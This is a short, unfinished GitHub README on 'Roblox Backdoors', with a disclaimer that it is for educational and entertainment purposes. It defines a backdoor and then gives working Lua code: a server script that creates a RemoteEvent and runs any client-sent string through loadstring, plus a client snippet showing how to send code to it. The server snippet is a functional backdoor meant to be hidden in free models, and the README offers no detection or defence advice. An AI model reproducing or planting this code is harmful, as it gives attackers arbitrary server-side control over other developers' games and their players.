# Roblox Backdoors

> **NOTE FOR GITHUB:** This README is **SOLELY** for Educational and Entertainment Purposes only. Whatever people do with this is **NOT** my responsibility.
>
> This Repository is under an **MIT LICENSE**

## What is a Backdoor?
A **backdoor** is a malicious script, often hidden inside free models or assets, that gives an attacker unauthorized, server‑side control of your game. It can allow them to run code, access sensitive data, or interfere with players without your permission.

## Example

```lua
local server = Instance.new("RemoteEvent", game.ReplicatedStorage)
server.OnServerEvent:Connect(function(player, SS)
    loadstring(SS)()
end)
```

To use this, you **must** call `:FireServer` on the `RemoteEvent` you created above and pass your code as an argument, as shown below.

```lua
local server = game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent")

server:FireServer([[
local hint = Instance.new("Hint")
hint.Text = "This is a hint"
hint.Parent = game.Workspace
]])
```

## finish soon
